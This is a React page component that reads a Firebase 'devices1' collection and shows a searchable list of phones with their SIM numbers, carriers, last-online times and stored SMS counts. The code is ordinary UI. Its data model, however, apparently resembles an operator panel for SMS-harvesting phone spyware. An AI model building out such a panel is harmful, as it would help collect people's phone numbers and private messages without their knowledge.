import React, { useState, useEffect } from 'react';
import { ref, onValue } from 'firebase/database';
import { db } from '../firebase';
import { useNavigate } from 'react-router-dom';

const DevicesPage = () => {
  const [devices, setDevices] = useState([]);
  const [searchText, setSearchText] = useState("");  // ⭐ NEW
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const navigate = useNavigate();

  useEffect(() => {
    const devicesRef = ref(db, 'devices1');

    const unsubscribe = onValue(
      devicesRef,
      (snapshot) => {
        try {
          const devicesData = snapshot.val();
          if (devicesData) {
            const devicesList = Object.entries(devicesData).map(([deviceId, d]) => {
              const smsCount = d.sms ? Object.keys(d.sms).length : 0;

              return {
                id: deviceId,
                deviceId,
                deviceName: d.deviceInfo?.deviceName || "Unknown Device",
                manufacturer: d.deviceInfo?.manufacturer || "Unknown",

                sim1Number: d.simInfo?.sim1_number || "N/A",
                sim2Number: d.simInfo?.sim2_number || "N/A",
                sim1Operator: d.simInfo?.sim1_operator || "N/A",
                sim2Operator: d.simInfo?.sim2_operator || "N/A",
                primarySim: d.simInfo?.primarySim || 1,

                lastOnline: d.lastOnline || null,

                smsCount
              };
            });

            setDevices(devicesList);
          } else {
            setDevices([]);
          }

          setLoading(false);
        } catch (err) {
          setError("Error fetching devices: " + err.message);
          setLoading(false);
        }
      },
      (err) => {
        setError("Error fetching devices: " + err.message);
        setLoading(false);
      }
    );

    return () => unsubscribe();
  }, []);

  const handleDeviceClick = (deviceId) => {
    navigate(`/device/${deviceId}`);
  };

  const formatSim = (num) => {
    if (!num || num === "N/A") return "N/A";
    return num;
  };

  const formatLastOnline = (timestamp) => {
    if (!timestamp) return "Unknown";

    const diff = Date.now() - timestamp;
    const min = Math.floor(diff / 60000);

    if (min < 1) return "Just now";
    if (min < 60) return `${min} min ago`;

    const hours = Math.floor(min / 60);
    if (hours < 24) return `${hours} hr ago`;

    const days = Math.floor(hours / 24);
    return `${days} days ago`;
  };

  // ⭐ FILTER DEVICES USING SEARCH TEXT
  const filteredDevices = devices.filter((d) => {
    const text = searchText.toLowerCase();

    return (
      d.deviceName.toLowerCase().includes(text) ||
      d.deviceId.toLowerCase().includes(text) ||
      d.manufacturer.toLowerCase().includes(text) ||
      d.sim1Number.toLowerCase().includes(text) ||
      d.sim2Number.toLowerCase().includes(text) ||
      d.sim1Operator.toLowerCase().includes(text) ||
      d.sim2Operator.toLowerCase().includes(text)
    );
  });

  if (loading) return <div className="loading">Loading devices...</div>;
  if (error) return <div className="error">{error}</div>;

  return (
    <div>
      <div className="page-header">
        <h1 className="page-title">Devices</h1>
        <div className="badge badge-primary">Total: {devices.length} devices</div>
      </div>

      {/* ⭐ SEARCH BAR ADDED */}
      <div className="card" style={{ marginBottom: "15px", padding: "10px" }}>
        <input
          type="text"
          className="form-input"
          placeholder="Search device, SIM, operator, ID..."
          value={searchText}
          onChange={(e) => setSearchText(e.target.value)}
          style={{ width: "100%", padding: "8px" }}
        />
      </div>

      {filteredDevices.length === 0 ? (
        <div className="card">
          <p>No devices found.</p>
        </div>
      ) : (
        <>
          {/* DESKTOP TABLE */}
          <table className="table">
            <thead>
              <tr>
                <th>Device</th>
                <th>Manufacturer</th>
                <th>SIM 1</th>
                <th>SIM 2</th>
                <th>Primary SIM</th>
                <th>Last Online</th>
                <th>SMS</th>
                <th>Device ID</th>
              </tr>
            </thead>

            <tbody>
              {filteredDevices.map((d) => (
                <tr
                  key={d.id}
                  className="card-clickable"
                  onClick={() => handleDeviceClick(d.deviceId)}
                >
                  <td><strong>{d.deviceName}</strong></td>
                  <td>{d.manufacturer}</td>

                  <td>
                    {formatSim(d.sim1Number)} <br />
                    <span className="badge badge-success">{d.sim1Operator}</span>
                  </td>

                  <td>
                    {formatSim(d.sim2Number)} <br />
                    <span className="badge badge-warning">{d.sim2Operator}</span>
                  </td>

                  <td>
                    <span className="badge badge-primary">
                      {d.primarySim === 1 ? "SIM 1" : "SIM 2"}
                    </span>
                  </td>

                  <td>{formatLastOnline(d.lastOnline)}</td>

                  <td><span className="badge badge-primary">{d.smsCount}</span></td>

                  <td><code style={{ fontSize: "0.8rem" }}>{d.deviceId}</code></td>
                </tr>
              ))}
            </tbody>
          </table>

          {/* MOBILE CARDS */}
          <div className="mobile-devices-list">
            {filteredDevices.map((d) => (
              <div
                key={d.id}
                className="mobile-device-card card-clickable"
                onClick={() => handleDeviceClick(d.deviceId)}
              >
                <div className="mobile-device-header">
                  <div className="device-name">{d.deviceName}</div>
                  <span className="badge badge-primary">{d.smsCount} SMS</span>
                </div>

                <div className="device-meta">
                  <div className="meta-item">
                    <span className="meta-label">Manufacturer:</span>
                    <span className="meta-value">{d.manufacturer}</span>
                  </div>

                  <div className="meta-item">
                    <span className="meta-label">SIM 1:</span>
                    <span className="meta-value">
                      {formatSim(d.sim1Number)} — 
                      <span className="badge badge-success">{d.sim1Operator}</span>
                    </span>
                  </div>

                  <div className="meta-item">
                    <span className="meta-label">SIM 2:</span>
                    <span className="meta-value">
                      {formatSim(d.sim2Number)} — 
                      <span className="badge badge-warning">{d.sim2Operator}</span>
                    </span>
                  </div>

                  <div className="meta-item">
                    <span className="meta-label">Primary SIM:</span>
                    <span className="meta-value">
                      <span className="badge badge-info">
                        {d.primarySim === 1 ? "SIM 1" : "SIM 2"}
                      </span>
                    </span>
                  </div>

                  <div className="meta-item">
                    <span className="meta-label">Last Online:</span>
                    <span className="meta-value">{formatLastOnline(d.lastOnline)}</span>
                  </div>

                  <div className="meta-item">
                    <span className="meta-label">Device ID:</span>
                    <span className="meta-value">{d.deviceId}</span>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </>
      )}
    </div>
  );
};

export default DevicesPage;
